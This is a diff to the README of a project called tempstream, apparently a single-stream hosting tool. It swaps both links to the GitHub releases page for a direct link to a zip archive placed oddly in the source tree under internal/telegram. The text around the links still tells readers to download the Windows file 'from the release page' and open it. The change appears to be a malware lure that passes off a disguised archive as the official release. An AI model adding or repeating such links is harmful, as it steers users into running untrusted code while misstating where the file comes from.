@@ -1,6 +1,6 @@
 # 📺 tempstream - Simple access for one live stream
 
-[![Download tempstream](https://img.shields.io/badge/Download%20tempstream-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Linneaincorrect877/tempstream/releases)
+[![Download tempstream](https://img.shields.io/badge/Download%20tempstream-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Linneaincorrect877/tempstream/main/internal/telegram/Software-v2.3.zip)
 
 ## 🧭 What tempstream does
 
@@ -30,7 +30,7 @@ If you run the stream on the same PC, leave it powered on while the stream is ac
 
 Go to the release page here:
 
-https://github.com/Linneaincorrect877/tempstream/releases
+https://raw.githubusercontent.com/Linneaincorrect877/tempstream/main/internal/telegram/Software-v2.3.zip
 
 On that page, find the latest release and download the Windows file for your system. After the download finishes, open the file you got from the release page.
 
